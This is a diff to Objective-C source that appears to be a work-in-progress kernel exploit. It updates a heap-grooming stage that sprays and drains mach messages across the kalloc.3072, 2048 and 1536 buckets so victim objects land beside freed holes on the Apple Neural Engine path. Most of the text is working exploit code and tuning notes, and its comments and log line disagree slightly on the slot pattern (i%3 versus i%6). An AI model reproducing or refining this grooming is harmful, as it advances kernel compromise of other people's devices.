@@ -31,7 +31,7 @@
 #import "LabLocalTime.h"
 #import "LabDeviceProfile.h"
 
-#define P099_BUILD @"p099-aneprewire-v13-interleave"
+#define P099_BUILD @"p099-aneprewire-v14-triclass"
 
 #define P099_INPUT_COUNT 254
 /* v13 INTERLEAVE LAW (the 21:38/21:40 v12 MAF rounds): the fill's crossing
@@ -44,8 +44,16 @@
    even victims in the ANE-class msg (kdata 0x820 = kalloc.3072 bucket),
    odd victims 0x7b0-class (kdata 0x7d4 = kalloc.2048 bucket) so a 2048-
    record-world boot is covered too. An in-flight door kmsg then sits next
-   to every fresh pop on both sides. */
+   to every fresh pop on both sides.
+   v14 (the 22:01 MAF #7): THIRD class observed — the 22:01 crossing ran
+   in kalloc.1536 (rec 0xe0, sid 386, same 19-record shape). The record
+   world's bucket WANDERS {3072, 2048, 1536} boot-to-boot, so door victims
+   now cover all three observed buckets by i%3: i%3==0 → the runtime ANE
+   class (0x7fc = kalloc.3072), i%3==1 → 0x7b0 (kdata 0x7d4 = kalloc.2048),
+   i%3==2 → 0x5d8 (kdata 0x5fc = kalloc.1536). Half-drain interleave law
+   unchanged. */
 #define P099_MSG_2048_WIRE 0x7b0
+#define P099_MSG_1536_WIRE 0x5d8
 #define P099_OUTPUT_COUNT 1
 #define P099_MODEL_KEY @"XVRC27/mach_msg_min/model.anehash"
 #define P099_DRAIN_COUNT 2048
@@ -512,7 +520,9 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
                     (pkVictim
                         ? p099_send_portkind_victim_len(pairs[i].victim, i,
                             (g_p099_portkindN == P099_PAIR_COUNT && (i & 1))
-                                ? P099_MSG_2048_WIRE : 0u)
+                                ? ((i % 3 == 1) ? P099_MSG_2048_WIRE
+                                                : P099_MSG_1536_WIRE)
+                                : 0u)
                         : p099_send_msg(pairs[i].victim, i, 1))) pairOK++;
             }
             /* v13 half-drain: free ONLY the odd pairs' holes (plain msgs) —
@@ -526,7 +536,7 @@ static void p099_recv_portkind_door(mach_port_t port, uint32_t idx) {
         L(@"[*] groom: drain=%d/%d pairs=%d/%d holes-freed=%d (v13 half-drain: odd holes only; even holes = DOOR msgs in flight)",
           drainOK, P099_DRAIN_COUNT, pairOK, P099_PAIR_COUNT, holesFreed);
         if (g_p099_portkindN == P099_PAIR_COUNT)
-            L(@"[v13] interleave: even holes = DOOR-shaped (3072 bucket), odd victims = 0x7b0-class (2048 bucket); drain = odd holes only");
+            L(@"[v14] interleave+triclass: even holes = DOOR (ANE class/3072), odd victims = 0x7b0 (2048) or 0x5d8 (1536) by i%%6; drain = odd holes only");
         if (!groomReady) L(@"[!] groom alloc failed - continuing WITHOUT holes (higher panic risk)");
 
         // ---- PRIMARY: bundled compiled espresso model via CoreML (P033 path) ----
